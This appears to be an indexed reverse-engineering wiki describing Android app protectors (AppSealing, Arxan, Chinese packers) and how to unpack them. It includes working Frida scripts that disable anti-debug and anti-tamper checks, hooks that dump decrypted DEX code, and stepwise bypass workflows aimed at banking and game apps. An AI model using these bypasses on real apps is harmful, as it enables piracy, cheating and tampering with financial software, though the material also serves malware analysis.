layers.</p>"},{"location":"packers/appsealing/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/appsealing/#dex-encryption","title":"DEX Encryption","text":"<p>AppSealing encrypts application DEX files and decrypts them at runtime through the native <code>libcovault-appsec.so</code> library. Supports:</p> <ul> <li>Selective DEX encryption -- individual classes or packages can be marked for encryption</li> <li>ODEX protection -- prevents caching of decrypted optimized DEX</li> <li>Multi-DEX support -- handles apps with multiple DEX files</li> </ul> <p>The encrypted DEX is stored as <code>sealed1.dex</code> and loaded through a custom class loader initialized by <code>AppSealingZygote</code>.</p>"},{"location":"packers/appsealing/#so-file-encryption","title":"SO File Encryption","text":"<p>Native <code>.so</code> libraries are encrypted within the APK and decrypted at load time. This prevents static extraction and analysis of JNI code.</p>"},{"location":"packers/appsealing/#dll-encryption-unity","title":"DLL Encryption (Unity)","text":"<p>For Unity-based games, AppSealing encrypts <code>libil2cpp.so</code> and Mono assemblies (<code>.dll</code> files). This is a targeted feature for the gaming market where IL2CPP reverse engineering is a primary threat.</p>"},{"location":"packers/appsealing/#anti-debugging","title":"Anti-Debugging","text":"<p>Detects ptrace-based debuggers, JDWP connections, and common debugging tools. The native security component uses <code>kill</code>, <code>signal</code>, and <code>alarm</code> syscalls to terminate the process when debugging is detected. Patching or hooking these three functions at the native level prevents the crash-on-detection behavior.</p>"},{"location":"packers/appsealing/#anti-decompile","title":"Anti-Decompile","text":"<p>Inserts invalid bytecode sequences and malformed headers that cause decompilers (JADX, JEB, Procyon) to fail on protected classes. This is a static analysis impediment only and does not affect runtime execution.</p>"},{"location":"packers/appsealing/#root-and-emulator-detection","title":"Root and Emulator Detection","text":"<p>Checks for:</p> <ul> <li><code>su</code> binary presence and known root management apps</li> <li>Magisk artifacts (though detection is basic compared to DexProtector or Promon)</li> <li>Emulator indicators via Build properties and hardware fingerprints</li> <li>Common emulator packages (Genymotion, BlueStacks, Nox)</li> </ul>"},{"location":"packers/appsealing/#cheat-tool-detection","title":"Cheat Tool Detection","text":"<p>Targets game modification tools:</p> <ul> <li>GameGuardian memory editor</li> <li>Lucky Patcher</li> <li>Xposed framework</li> <li>Frida (basic port check)</li> <li>Speed hack tools (Cheat Engine mobile variants)</li> </ul>"},{"location":"packers/appsealing/#repackaging-prevention","title":"Repackaging Prevention","text":"<p>Signature verification against the original signing certificate. Detects APK modification by comparing checksums of critical components.</p>"},{"location":"packers/appsealing/#weaknesses","title":"Weaknesses","text":""},{"location":"packers/appsealing/#string-encryption","title":"String Encryption","text":"<p>AppSealing's string encryption is weak. Encrypted strings in the native layer use simple transformations that are easily reversible through static analysis of <code>libcovault-appsec.so</code>. This contrasts with DexGuard's polymorphic per-build string encryption or DexProtector's white-box key derivation.</p>"},{"location":"packers/appsealing/#detection-bypass-surface","title":"Detection Bypass Surface","text":"<p>The detection methods rely on predictable check patterns. The native security component's use of <code>kill</code>, <code>signal</code>, and <code>alarm</code> for enforcement means that hooking these three libc functions neutralizes the entire crash-on-detection mechanism in one pass:</p> <pre><code>var kill = Module.findExportByName(\"libc.so\", \"kill\");\nInterceptor.attach(kill, {\n    onEnter: function(args) {\n        console.log(\"Blocked kill(\" + args[0] + \", \" + args[1] + \")\");\n        args[0] = ptr(0);\n    }\n});\n\nvar signal_func = Module.findExportByName(\"libc.so\", \"signal\");\nInterceptor.attach(signal_func, {\n    onEnter: function(args) {\n        console.log(\"Blocked signal(\" + args[0] + \")\");\n    },\n    onLeave: function(retval) {\n        retval.replace(ptr(0));\n    }\n});\n\nvar alarm = Module.findExportByName(\"libc.so\", \"alarm\");\nInterceptor.attach(alarm, {\n    onEnter: function(args) {\n        console.log(\"Blocked alarm(\" + args[0] + \")\");\n        args[0] = ptr(0);\n    }\n});\n</code></pre>"},{"location":"packers/appsealing/#java-side-message-box-bypass","title":"Java-Side Message Box Bypass","text":"<p>AppSealing displays a Java-side dialog when it detects a hostile environment (root, hook, cheat tool). This dialog can be suppressed via Xposed hooks on <code>AlertDialog.Builder</code> or by hooking the specific AppSealing callback class, allowing the app to continue running on detected devices.</p>"},{"location":"packers/appsealing/#unpacking-approaches","title":"Unpacking Approaches","text":""},{"location":"packers/appsealing/#apppealing-xposed-module","title":"AppPealing Xposed Module","text":"<p>AppPealing is a purpose-built Xposed module that:</p> <ul> <li>Disables cheat tool detection checks</li> <li>Dumps encrypted DEX files after decryption</li> <li>Decrypts sealed DEX payloads from the <code>assets/AppSealing/</code> directory</li> <li>Patches the <code>AppSealingZygote</code> initialization to skip integrity checks</li> </ul> <p>This is the most targeted public tool for AppSealing bypass. Install via LSPosed, scope to the target app, and the module handles DEX extraction automatically.</p>"},{"location":"packers/appsealing/#appsealing-reversal","title":"Appsealing-Reversal","text":"<p>Appsealing-Reversal provides a full analysis of the AppSealing protection scheme, including:</p> <ul> <li>Detailed breakdown of the native library initialization flow</li> <li>Identification of all check points and enforcement mechanisms</li> <li>Bypass strategies for each protection layer</li> <li>Documentation of the asset file format and encryption scheme</li> </ul>"},{"location":"packers/appsealing/#frida-dexdump","title":"frida-dexdump","text":"<p>Standard frida-dexdump works for DEX recovery from AppSealing-protected apps:</p> <pre><code>frida-dexdump -FU\n</code></pre> <p>After the app initializes and <code>AppSealingZygote</code> decrypts the sealed DEX into memory, frida-dexdump scans for DEX magic bytes and dumps all loaded DEX files. Filter the output by size to separate application DEX from framework and AppSealing wrapper DEX.</p>"},{"location":"packers/appsealing/#combined-frida-bypass","title":"Combined Frida Bypass","text":"<p>A combined approach using Frida to neutralize all protection layers simultaneously:</p> <pre><code>Java.perform(function() {\n    var System = Java.use(\"java.lang.System\");\n    System.exit.implementation = function(code) {\n        console.log(\"Blocked System.exit(\" + code + \")\");\n    };\n\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exit.implementation = function(code) {\n        console.log(\"Blocked Runtime.exit(\" + code + \")\");\n    };\n});\n\n[\"kill\", \"signal\", \"alarm\"].forEach(function(fname) {\n    var func = Module.findExportByName(\"libc.so\", fname);\n    if (func) {\n        Interceptor.attach(func, {\n            onEnter: function(args) {\n                console.log(\"Neutralized \" + fname);\n                args[0] = ptr(0);\n            }\n        });\n    }\n});\n</code></pre> <p>Use with <code>frida -f</code> in spawn mode to inject before <code>AppSealingZygote</code> initializes. Once the protection checks are neutralized, attach frida-dexdump to dump the decrypted DEX.</p>"},{"location":"packers/appsealing/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature AppSealing DexGuard DexProtector Chinese Packers Delivery model SaaS (upload APK) Gradle plugin (source required) Post-build CLI SaaS / CLI DEX encryption Yes (selective) Yes (class-level) Yes Yes (whole DEX) String encryption Weak Strong (polymorphic) Strong (white-box) Basic XOR Code virtualization No Optional Hide Access No Anti-Frida Basic (port check) Comprehensive Comprehensive Basic Anti-root Moderate Comprehensive Comprehensive Basic Unity/game support Yes (dedicated) No Limited No Unpacking difficulty Low-Medium Medium-Hard Medium-Hard Easy-Medium Public bypass tools Yes (AppPealing, Appsealing-Reversal) Limited Limited Yes (generic DEX dump) <p>AppSealing occupies a similar market position to Chinese packers in terms of protection strength but targets the Korean and international SaaS market. Its protections are substantially weaker than DexGuard or DexProtector, and the existence of dedicated bypass tools (AppPealing) makes it one of the easier commercial protectors to defeat.</p>"},{"location":"packers/appsealing/#industry-usage","title":"Industry Usage","text":"<p>AppSealing is primarily deployed in:</p> <ul> <li>Korean banking apps -- financial institutions using AppSealing as part of compliance requirements</li> <li>Unity and Unreal games -- anti-cheat and anti-tamper for mobile games, particularly Korean game publishers</li> <li>Enterprise applications -- corporate apps requiring basic IP protection without build pipeline changes</li> </ul> <p>The SaaS model makes it attractive for organizations without dedicated mobile security engineering teams. Upload the APK, configure protection options via the web console, and download the protected build.</p>"},{"location":"packers/appsealing/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Run APKiD -&gt; confirm \"packer : appsealing\"\n2. Check for libcovault-appsec.so and assets/AppSealing/ directory\n3. Install on rooted device with LSPosed + AppPealing module\n4. Launch app -&gt; AppPealing dumps decrypted DEX automatically\n5. Alternative: Frida spawn mode with kill/signal/alarm hooks + frida-dexdump\n6. Decompile dumped DEX with JADX\n7. If Unity game: extract and analyze decrypted libil2cpp.so with IL2CPPDumper\n</code></pre>"},{"location":"packers/appsealing/#references","title":"References","text":"<ul> <li>AppSealing Official</li> <li>APKiD -- Packer Detection</li> <li>AppPealing Xposed Module</li> <li>Appsealing-Reversal -- Full Bypass Analysis</li> <li>frida-dexdump -- Automated DEX Dumping</li> <li>INKA Entworks</li> </ul>"},{"location":"packers/arxan/","title":"Arxan (Digital.ai Application Protection)","text":"<p>Arxan is a commercial application protection platform originally developed by Arxan Technologies, now part of Digital.ai. Founded in 2001 by researchers from Purdue University's CERIAS Institute, Arxan pioneered guard-based software protection -- a mesh of interdependent protection routines embedded directly into application binaries. It is the dominant protector in banking, financial services, and high-value gaming apps.</p>"},{"location":"packers/arxan/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Digital.ai (formerly Arxan Technologies) Origin USA (founded at Purdue University, West Lafayette, Indiana) Type Commercial Protector/Obfuscator/RASP Platforms Android, iOS, Windows, macOS, Linux, ARM Products GuardIT (code protection), EnsureIT (native/ARM protection), TransformIT (white-box crypto) Acquisition TA Associates (2013), merged into Digital.ai (2020) Website digital.ai/products/app-protection"},{"location":"packers/arxan/#identification","title":"Identification","text":""},{"location":"packers/arxan/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD detects Arxan with signatures targeting both DEX and native layers:</p> <pre><code>obfuscator : Arxan\nobfuscator : Arxan (GuardIT)\n</code></pre> <p>DEX-level detection looks for the <code>Lcom/arxan/guardit</code> package path. Native (ELF) detection targets bytecode patterns characteristic of Arxan's control flow obfuscation, specifically sequences involving <code>move-result</code>, <code>and-int/2addr</code>, and <code>xor-int/lit8</code> operations.</p>"},{"location":"packers/arxan/#file-artifacts","title":"File Artifacts","text":"Artifact Description Package path <code>com.arxan.guardit</code> or obfuscated variants in DEX Native libraries Protected <code>.so</code> files with guard code injected at the object level Control flow patterns Functions split into disconnected basic blocks with opaque predicates String tables Encrypted or absent string literals in native binaries Guard stubs Small code fragments scattered throughout the binary performing integrity checks Section anomalies Modified ELF sections from guard injection post-compilation"},{"location":"packers/arxan/#distinguishing-from-other-protectors","title":"Distinguishing from Other Protectors","text":"<p>Arxan operates primarily at the native (ARM/ELF) level, unlike DexGuard which focuses on DEX-layer protection. Key distinguishing traits:</p> <ul> <li>Guard code is injected post-compilation into the final binary, not during build</li> <li>Functions are fragmented into basic blocks connected by opaque predicates</li> <li>Cyclic CRC checks run continuously at runtime across code regions</li> <li>No single \"unpacking stub\" -- protection is distributed throughout the binary</li> <li>Both Java/Kotlin and native code can be protected simultaneously</li> </ul>"},{"location":"packers/arxan/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/arxan/#guard-network","title":"Guard Network","text":"<p>The core differentiator. Arxan embeds a network of small, interdependent code units called Guards throughout the application binary. Each guard performs a specific security function. Guards protect other guards in a mesh topology -- removing or patching one guard triggers detection by others.</p> Guard Type Function Checksum Guard Computes integrity hash over a defined code range, detects modification Repair Guard Restores tampered code by overwriting a corrupted range with the original bytes Anti-Debug Guard Detects attached debuggers via ptrace, TracerPid, timing checks Damage Guard Overwrites specified code ranges with random bytes during dynamic analysis Notification Guard Calls back to a server or triggers an alert when tampering is detected State Guard Tracks application state to detect inconsistencies from patching <p>The guard network creates a defend-detect-react cycle:</p> <ol> <li>Defend -- obfuscation and guards make the binary resistant to static analysis</li> <li>Detect -- checksum and state guards identify runtime modifications</li> <li>React -- repair guards restore code, damage guards corrupt attacker state, notification guards alert</li> </ol> <p>Because guards protect each other, an attacker cannot simply NOP out a single check. Removing guard A causes guard B (which checksums guard A's code range) to trigger, which in turn activates guard C for repair or damage response.</p>"},{"location":"packers/arxan/#code-obfuscation","title":"Code Obfuscation","text":""},{"location":"packers/arxan/#control-flow-flattening","title":"Control Flow Flattening","text":"<p>Functions are restructured so the original control flow is hidden behind a dispatcher loop. All basic blocks become siblings under a switch statement, with the next block selected by an opaque state variable.</p>"},{"location":"packers/arxan/#opaque-predicates","title":"Opaque Predicates","text":"<p>Conditional branches inserted throughout the code that always resolve the same way at runtime but appear ambiguous during static analysis. These inflate the control flow graph and defeat pattern-based decompilation.</p>"},{"location":"packers/arxan/#stack-based-obfuscation","title":"Stack-Based Obfuscation","text":"<p>Local variables and intermediate values are pushed through stack manipulations that obscure data flow, making it difficult to track values through a function in a decompiler.</p>"},{"location":"packers/arxan/#symbol-stripping-and-renaming","title":"Symbol Stripping and Renaming","text":"<p>All exported symbols, function names, and debug information are stripped or renamed to prevent identification of function purpose.</p>"},{"location":"packers/arxan/#string-encryption","title":"String Encryption","text":"<p>String literals in both native and Java/Kotlin code are encrypted at rest. Decryption happens at runtime through guard-protected routines. Unlike DexGuard where strings decrypt via simple method calls, Arxan string decryption is interleaved with the guard network -- the decryption key material may itself be protected by checksum guards.</p>"},{"location":"packers/arxan/#white-box-cryptography-transformit","title":"White-Box Cryptography (TransformIT)","text":"<p>TransformIT implements standard cryptographic algorithms (AES, DES, RSA) with mathematically transformed key representations. The key never exists in memory in its standard form. Instead, the algorithm and key are fused into a single lookup-table-based implementation.</p> <p>Properties:</p> <ul> <li>Produces identical output to standard crypto implementations</li> <li>Key extraction requires reversing the mathematical transformation, not just memory dumping</li> <li>Supports all major algorithms and modes</li> <li>Minimal code footprint for mobile deployment</li> <li>Protected by the guard network -- tampering with the white-box tables triggers integrity guards</li> </ul>"},{"location":"packers/arxan/#anti-tampering","title":"Anti-Tampering","text":"<ul> <li>Cyclic CRC checks across code regions, running continuously at runtime</li> <li>APK signature verification against expected certificate</li> <li>Code range checksums validated by multiple overlapping guards</li> <li>Response options: crash, SIGILL, silent data corruption, delayed failure, self-repair</li> </ul>"},{"location":"packers/arxan/#anti-debugging","title":"Anti-Debugging","text":"Technique Implementation ptrace self-attach Prevents debugger attachment by occupying the ptrace slot TracerPid monitoring Polls <code>/proc/self/status</code> for non-zero TracerPid Timing checks Measures execution time between guard invocations to detect single-stepping JDWP detection Checks for Java Debug Wire Protocol thread presence Breakpoint scanning Scans code regions for software breakpoint instructions (0xCC / BKPT) Signal handler hooks Monitors for debugger-installed signal handlers"},{"location":"packers/arxan/#root-and-environment-detection","title":"Root and Environment Detection","text":"Check Method Root su binary, Magisk artifacts, SuperSU, system partition writability Emulator Build properties, hardware fingerprints, sensor availability Frida frida-server port (27042), frida-agent in <code>/proc/maps</code>, named pipes Hooking frameworks Xposed, Substrate, LSPosed class presence and stack inspection Repackaging Certificate mismatch, APK path validation"},{"location":"packers/arxan/#dynamic-key-protection","title":"Dynamic Key Protection","text":"<p>Cryptographic keys can be bound to device-specific attributes or server-issued tokens. Keys are never stored in plaintext and are reconstructed at runtime through guard-protected derivation functions. If any guard in the derivation chain detects tampering, the key material is corrupted.</p>"},{"location":"packers/arxan/#unpacking-bypass-approaches","title":"Unpacking / Bypass Approaches","text":""},{"location":"packers/arxan/#challenges","title":"Challenges","text":"<p>Arxan is significantly harder to bypass than DEX-level protectors because:</p> <ul> <li>Protection is distributed (no single point of failure)</li> <li>Guards run continuously, not just at startup</li> <li>Native-level obfuscation resists standard Java-layer hooking</li> <li>CRC checks detect code patching in real time</li> </ul>"},{"location":"packers/arxan/#frida-based-approaches","title":"Frida-Based Approaches","text":""},{"location":"packers/arxan/#bypassing-crc-guards","title":"Bypassing CRC Guards","text":"<p>CRC guards operate over defined code ranges. Frida can be used to intercept and neutralize these checks, but timing is critical -- attaching Frida itself can trigger anti-hook detection.</p> <pre><code>Java.perform(function() {\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exec.overload(\"java.lang.String\").implementation = function(cmd) {\n        if (cmd.indexOf(\"su\") !== -1) {\n            return null;\n        }\n        return this.exec(cmd);\n    };\n});\n</code></pre> <p>For native-level CRC bypass, trampolines can redirect CRC check functions to return expected values. This requires identifying the CRC function addresses first through static analysis.</p>"},{"location":"packers/arxan/#zygiskfrida-for-stealth-injection","title":"ZygiskFrida for Stealth Injection","text":"<p>Standard Frida injection modifies the APK or attaches via ptrace, both detectable by Arxan. ZygiskFrida injects the Frida gadget through Zygisk at process spawn, avoiding APK modification (signature checks pass) and ptrace-based detection.</p>"},{"location":"packers/arxan/#timing-aware-hooking","title":"Timing-Aware Hooking","text":"<p>Arxan's timing checks measure intervals between guard executions. Hooks that introduce latency will trigger detection. Minimize hook logic and use <code>Interceptor.replace</code> over <code>Interceptor.attach</code> where possible to reduce overhead.</p>"},{"location":"packers/arxan/#static-analysis-approach","title":"Static Analysis Approach","text":"<ol> <li>Load the native library in IDA Pro / Ghidra</li> <li>Identify control flow flattening dispatcher blocks (large switch statements with state variables)</li> <li>Use D-810 (IDA) or similar deobfuscation plugins to resolve opaque predicates</li> <li>Map CRC guard functions by looking for code range scanning patterns (reading 4-8 byte windows across sections)</li> <li>Trace guard-to-guard references to map the guard network topology</li> <li>Patch or ignore guard functions once the network is understood</li> </ol>"},{"location":"packers/arxan/#binary-patching-with-guard-awareness","title":"Binary Patching with Guard Awareness","text":"<p>Patching a single guard without accounting for the network causes cascading failures. Approaches:</p> <ul> <li>Map the complete guard dependency graph before patching</li> <li>Patch all guards that reference the target code range simultaneously</li> <li>Replace CRC expected values at every checkpoint, not just one</li> <li>Consider using Frida to dynamically NOP guards at runtime instead of static patching</li> </ul>"},{"location":"packers/arxan/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Run APKiD -&gt; confirm Arxan / GuardIT detection\n2. Determine scope: is protection on native libs, DEX, or both?\n3. Load native .so in Ghidra/IDA -&gt; identify flattened control flow\n4. Map guard network: find CRC ranges, repair stubs, damage handlers\n5. Deploy ZygiskFrida for stealthy injection\n6. Hook anti-debug guards first (ptrace, TracerPid checks)\n7. Disable root/environment detection\n8. Identify and hook CRC guard functions to return expected values\n9. Target white-box crypto if key extraction is the goal\n10. For string decryption, hook the decryption routines and log output\n</code></pre>"},{"location":"packers/arxan/#industry-adoption","title":"Industry Adoption","text":"<p>Arxan / Digital.ai Application Protection is the go-to protector for high-value mobile applications, particularly in financial services.</p>"},{"location":"packers/arxan/#sectors","title":"Sectors","text":"Sector Usage Banking Major retail and commercial banks worldwide use Arxan for mobile banking apps Payments Payment processing and digital wallet apps Gaming High-revenue mobile games (notably Supercell titles) Automotive Connected car and telematics applications Healthcare Medical device and health data applications Media/DRM Content protection and digital rights management"},{"location":"packers/arxan/#banking-context","title":"Banking Context","text":"<p>Arxan is one of the most widely deployed protectors across global banking apps. A documented case study shows a major Brazilian bank using Digital.ai Application Protection to successfully defend against the BrasDex banking trojan while other institutions were compromised. Banking deployments typically combine:</p> <ul> <li>Guard network for code integrity</li> <li>White-box cryptography for key protection</li> <li>RASP (Runtime Application Self-Protection) via App Aware for real-time monitoring</li> <li>Server-side telemetry for attack pattern analysis</li> </ul> <p>For analysts reverse-engineering banking apps protected by Arxan, expect the full protection stack active simultaneously, with multiple guard layers requiring systematic bypass before reaching target functionality.</p>"},{"location":"packers/arxan/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature Arxan DexGuard Virbox Chinese Packers Primary layer Native (ARM/ELF) DEX (Dalvik) DEX + Native VM DEX-in-assets Guard network Mesh of interdependent guards Independent checks Not applicable Not applicable White-box crypto TransformIT (dedicated) Not included Not included Not included Code virtualization No (uses obfuscation) Optional, limited Core feature Not available Anti-debug depth Deep (ptrace, timing, breakpoint scan) Comprehensive (ptrace, JDWP, Frida) Moderate (ptrace, flags) Basic (ptrace) Self-repair Repair guards restore tampered code No self-repair No self-repair No self-repair Primary market Banking, gaming, enterprise Banking, general Android Chinese market Chinese market Unpacking difficulty High (distributed guards, native-level) Medium (Frida hooks effective) High (VM interpretation) Low (standard DEX dump)"},{"location":"packers/arxan/#references","title":"References","text":"<ul> <li>Digital.ai Application Protection</li> <li>Arxan Technologies -- Wikipedia</li> <li>APKiD -- Android Application Identifier</li> <li>APKiD Arxan Detection Rules (Issue #24)</li> <li>Frida GuardIT/Arxan Bypass Discussion (Issue #949)</li> <li>Giovanni Rocca -- Reverse Engineering Supercell (Arxan)</li> <li>ZygiskFrida -- Stealthy Frida Injection</li> <li>Digital.ai App Security Saves Bank Millions</li> <li>Arxan White-Box Cryptography Solution Brief</li> </ul>"},{"location":"packers/chinese-packers/","title":"Chinese Packers","text":"<p>Chinese packing services dominate Android malware protection. Since Google Play is unavailable in China, apps distribute through OEM stores (Tencent, Baidu, Xiaomi) that don't enforce the same restrictions. Chinese packers are free or cheap, widely available, and frequently abused by malware authors.</p>"},{"location":"packers/chinese-packers/#overview","title":"Overview","text":"Packer Vendor Free Tier APKiD Signature Tencent Legu Tencent Yes <code>packer : Tencent Legu</code> 360 Jiagu Qihoo 360 Yes <code>packer : Qihoo 360</code> Bangcle (SecNeo) Bangcle Yes <code>packer : Bangcle</code> Baidu Reinforcement Baidu Yes <code>packer : Baidu</code> iJiami iJiami Limited <code>packer : iJiami</code> NeteaseYiDun NetEase Limited <code>packer : NetEase</code> APKProtect Nagain Yes <code>packer : APKProtect</code>"},{"location":"packers/chinese-packers/#tencent-legu","title":"Tencent Legu","text":"<p>The most widely used Chinese packer. Free protection service integrated with Tencent's app distribution ecosystem.</p>"},{"location":"packers/chinese-packers/#identification","title":"Identification","text":"Artifact Description Native library <code>libshell-super.2019.so</code>, <code>libshella-*.so</code>, or <code>libtxoprot.so</code> DEX stub Minimal <code>classes.dex</code> with shell loader class Asset files Encrypted DEX in <code>assets/</code> (e.g., <code>classes.dex.dat</code>) Metadata <code>tencent_stub</code> in APK metadata"},{"location":"packers/chinese-packers/#protection","title":"Protection","text":"<ul> <li>DEX encryption with AES</li> <li>Native library anti-debugging (ptrace self-attach)</li> <li>Emulator detection via hardware properties</li> <li>Anti-Frida checks (port scanning, /proc/maps inspection)</li> <li>String encryption in native layer</li> <li>Code segment checksumming</li> </ul>"},{"location":"packers/chinese-packers/#unpacking","title":"Unpacking","text":"<ol> <li>Hook <code>DexClassLoader</code> or <code>InMemoryDexClassLoader</code> to intercept DEX loading</li> <li>Dump DEX bytes from memory after native loader decrypts</li> <li>Alternative: use <code>frida-dexdump</code> which scans process memory for DEX headers</li> </ol>"},{"location":"packers/chinese-packers/#qihoo-360-jiagu","title":"Qihoo 360 Jiagu","text":"<p>Free protection from Qihoo 360, one of China's largest security companies. Frequently seen in both legitimate Chinese apps and malware.</p>"},{"location":"packers/chinese-packers/#identification_1","title":"Identification","text":"Artifact Description Native library <code>libjiagu.so</code>, <code>libjiagu_art.so</code>, <code>libjiagu_x86.so</code> DEX stub Stub application class loading encrypted payload Asset files <code>classes.dat</code>, <code>classes0.dex</code> in <code>assets/</code> Package prefix Loader classes in <code>com.qihoo.util</code> or <code>com.stub</code>"},{"location":"packers/chinese-packers/#protection_1","title":"Protection","text":"<ul> <li>Multi-layer DEX encryption</li> <li>Native anti-debugging with signal handlers</li> <li>VM detection via <code>/proc/cpuinfo</code> and hardware serial</li> <li>Function-level encryption (selected methods encrypted individually)</li> <li>Anti-memory-dump techniques (mprotect manipulation)</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_1","title":"Unpacking","text":"<p>Hook <code>dvmLoadNativeCode</code> or <code>JNI_OnLoad</code> in the jiagu library. The decrypted DEX is written to a temporary file before loading; monitoring file creation in the app's data directory can capture it.</p>"},{"location":"packers/chinese-packers/#bangcle-secneo","title":"Bangcle (SecNeo)","text":"<p>One of the earliest Chinese packers. Still encountered in older malware samples.</p>"},{"location":"packers/chinese-packers/#identification_2","title":"Identification","text":"Artifact Description Native library <code>libsecexe.so</code>, <code>libsecmain.so</code>, <code>libSecShell.so</code> DEX stub Minimal loader calling native initialization Asset files <code>classes.jar</code> or encrypted DEX in <code>assets/</code>"},{"location":"packers/chinese-packers/#protection_2","title":"Protection","text":"<ul> <li>DEX encryption and dynamic loading</li> <li>Anti-debugging via ptrace</li> <li>Root detection</li> <li>Basic emulator detection</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_2","title":"Unpacking","text":"<p>Older Bangcle versions use straightforward DEX-in-assets encryption. The native library decrypts and writes a temporary DEX file. Hook file operations or dump from <code>/proc/&lt;pid&gt;/maps</code>.</p>"},{"location":"packers/chinese-packers/#common-unpacking-strategy","title":"Common Unpacking Strategy","text":"<p>All Chinese packers follow a similar pattern:</p> <ol> <li>Stub <code>Application</code> class loads native library</li> <li>Native library decrypts the real DEX from assets</li> <li>Decrypted DEX loaded via <code>DexClassLoader</code> or <code>InMemoryDexClassLoader</code></li> <li>Real <code>Application</code> class instantiated and lifecycle delegated</li> </ol> <p>The universal approach:</p> <pre><code>Java.perform(function() {\n    var DexClassLoader = Java.use(\"dalvik.system.DexClassLoader\");\n    DexClassLoader.$init.implementation = function(dexPath, optimizedDir, libraryPath, parent) {\n        console.log(\"[DexClassLoader] Loading: \" + dexPath);\n        this.$init(dexPath, optimizedDir, libraryPath, parent);\n    };\n\n    var InMemoryDexClassLoader = Java.use(\"dalvik.system.InMemoryDexClassLoader\");\n    InMemoryDexClassLoader.$init.overload(\"java.nio.ByteBuffer\", \"java.lang.ClassLoader\").implementation = function(buf, parent) {\n        console.log(\"[InMemoryDexClassLoader] Size: \" + buf.remaining());\n        this.$init(buf, parent);\n    };\n});\n</code></pre> <p>For automated dumping, <code>frida-dexdump</code> handles most Chinese packers without family-specific scripts.</p>"},{"location":"packers/chinese-packers/#malware-usage","title":"Malware Usage","text":"<p>Chinese packers are the most common protection found on malware samples:</p> Packer Notable Malware Usage Tencent Legu Triada firmware variants, Chinese adware Qihoo 360 Jiagu Banking trojans, Chinese-origin malware Bangcle Older banking trojans, BankBot variants Baidu Adware, Chinese-targeted malware <p>These packers are freely available, making them the default choice for budget-conscious malware operators. The protection is adequate against automated AV scanning but yields to manual analysis with Frida-based unpacking.</p>"},{"location":"packers/chinese-packers/#baidu-reinforcement","title":"Baidu Reinforcement","text":"<p>Baidu's free app protection service. Less sophisticated than Tencent Legu or Qihoo 360 but still encountered in malware samples, particularly Chinese-targeted adware and data-harvesting families.</p>"},{"location":"packers/chinese-packers/#identification_3","title":"Identification","text":"Artifact Description Native library <code>libbaiduprotect.so</code>, <code>libprotectClass.so</code> DEX stub Application class delegating to Baidu loader Asset files Encrypted payload in <code>assets/baiduprotect/</code>"},{"location":"packers/chinese-packers/#protection_3","title":"Protection","text":"<ul> <li>DEX encryption with custom algorithm</li> <li>Basic anti-debugging (ptrace)</li> <li>Emulator detection via Build properties</li> <li>No function-level encryption (entire DEX encrypted as blob)</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_3","title":"Unpacking","text":"<p>Straightforward DEX dump. The native library decrypts the entire DEX payload in one pass and loads via standard class loader. Hook <code>DexClassLoader</code> or dump from memory after load.</p>"},{"location":"packers/chinese-packers/#ijiami","title":"iJiami","text":"<p>Commercial packing service offering both free and paid tiers. The free tier provides basic encryption; paid tiers add anti-tampering, root detection, and code virtualization.</p>"},{"location":"packers/chinese-packers/#identification_4","title":"Identification","text":"Artifact Description Native library <code>libexecmain.so</code>, <code>libexec.so</code> DEX stub Shell class invoking native decryption Asset files <code>ijiami.dat</code> or encrypted DEX in <code>assets/ijiami/</code> Metadata <code>ijiami</code> references in APK resources"},{"location":"packers/chinese-packers/#protection_4","title":"Protection","text":"<ul> <li>Multi-layer DEX encryption</li> <li>Anti-debugging with signal handling</li> <li>Root detection (su, Magisk, system partition checks)</li> <li>Paid tier: method-level encryption, code virtualization</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_4","title":"Unpacking","text":"<p>Free tier: standard DEX dump via <code>frida-dexdump</code> or class loader hook. Paid tier with method-level encryption requires hooking individual method decryption calls, similar to DexGuard string decryption approach.</p>"},{"location":"packers/chinese-packers/#neteaseyidun","title":"NeteaseYiDun","text":"<p>NetEase's application security service, integrated with their gaming ecosystem. Most commonly seen in Chinese mobile games but occasionally in malware targeting Chinese users.</p>"},{"location":"packers/chinese-packers/#identification_5","title":"Identification","text":"Artifact Description Native library <code>libnesec.so</code>, <code>libNetHTProtect.so</code> Package <code>com.netease.nis.wrapper</code> package in DEX stub Asset files Encrypted payload in <code>assets/nis/</code>"},{"location":"packers/chinese-packers/#protection_5","title":"Protection","text":"<ul> <li>DEX encryption with multi-key scheme</li> <li>Anti-debugging and anti-hooking</li> <li>Integrity verification of native libraries</li> <li>Memory protection (mprotect on decrypted regions)</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_5","title":"Unpacking","text":"<p>Hook before mprotect calls revoke read access. The decrypted DEX resides in memory briefly before protection flags are set. Timing the dump is critical. <code>frida-dexdump</code> works if executed during the loading window.</p>"},{"location":"packers/chinese-packers/#apkprotect","title":"APKProtect","text":"<p>Nagain's free protection service. Less common than the major packers but still appears in budget malware operations.</p>"},{"location":"packers/chinese-packers/#identification_6","title":"Identification","text":"Artifact Description Native library <code>libAPKProtect.so</code> Asset files Encrypted DEX in <code>assets/apk_protect/</code>"},{"location":"packers/chinese-packers/#protection_6","title":"Protection","text":"<ul> <li>DEX encryption</li> <li>Basic anti-debugging</li> <li>Minimal obfuscation compared to competitors</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_6","title":"Unpacking","text":"<p>Simple DEX dump. <code>frida-dexdump</code> handles APKProtect without special configuration.</p>"},{"location":"packers/chinese-packers/#detection-and-triage","title":"Detection and Triage","text":""},{"location":"packers/chinese-packers/#rapid-packer-identification","title":"Rapid Packer Identification","text":"<pre><code>apkid sample.apk\n</code></pre> <p>If APKiD is unavailable, check for known native library markers:</p> Library Name Packer <code>libshella*.so</code>, <code>libshell-super*.so</code> Tencent Legu <code>libjiagu*.so</code> Qihoo 360 <code>libsecexe.so</code>, 